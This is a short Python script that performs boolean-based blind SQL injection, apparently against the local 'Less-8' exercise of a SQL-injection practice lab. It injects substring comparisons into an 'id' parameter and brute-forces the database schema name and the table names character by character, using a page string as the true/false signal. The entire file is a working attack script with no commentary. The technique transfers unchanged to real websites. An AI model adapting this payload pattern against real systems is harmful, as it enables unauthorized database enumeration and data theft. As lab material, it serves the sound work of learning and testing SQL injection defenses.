import requests
from lxml import etree
import time


def getdbname():
    url = "http://127.0.0.1/Less-8/?id=1'"
    name = "abcdefghijklmnopqrstuvwxyz_"
    result = ""
    for k in range(9):
        for i in name:
            payload = "and 1=(substr((select schema_name from information_schema.schemata limit 4,1)," + str(k) + ",1)=\'"+str(i)+  "\') --+"
            #print payload
            #time.sleep(1)
            res = requests.get(url+payload).text
            if "You are in" in res:

                result += i

    print "database name is: " + result

def gettablename():
    url = "http://127.0.0.1/Less-8/?id=1'"
    name = "abcdefghijklmnopqrstuvwxyz_"
    result = ""
    for num in range(5):
        for k in range(10):

            for i in name:
                payload = "and 1=(substr((select table_name from information_schema.tables where table_schema=\'security\' limit " + str(num) + ",1)," + str(k)+",1)=\'"+str(i)+"\') --+"
                #print payload
                #time.sleep(1)
                res = requests.get(url+payload).text
                if "You are in" in res:

                    result += i
        result += " "
    print "table name is : " + result


getdbname()
gettablename()
